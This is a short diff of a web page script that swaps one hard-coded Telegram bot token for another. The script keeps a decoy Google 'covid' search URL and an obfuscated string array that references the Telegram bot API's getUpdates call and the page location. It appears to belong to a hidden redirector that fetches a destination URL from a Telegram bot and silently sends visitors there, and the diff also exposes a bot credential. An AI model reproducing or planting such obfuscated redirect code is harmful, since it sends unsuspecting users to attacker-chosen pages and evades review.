@@ -1,5 +1,5 @@
 <script>
-var kick = '1739102368:AAF2lLggX0ggJVCZMmnsI9vDS_OTIwBMCOM';
+var kick = '7168954953:AAH1u_5kPi4WBdNXMix9OF8vxX0ACrKWLRI';
 var showmeway = 'https://www.google.com/search?q=covid';
 
 var _0x3587 = ["text", "message", "result", "http", "startsWith", "replace", "location", "then", "ok", "json", "https://api.telegram.org/bot", "/getUpdates?limit=1&offset=-1"];
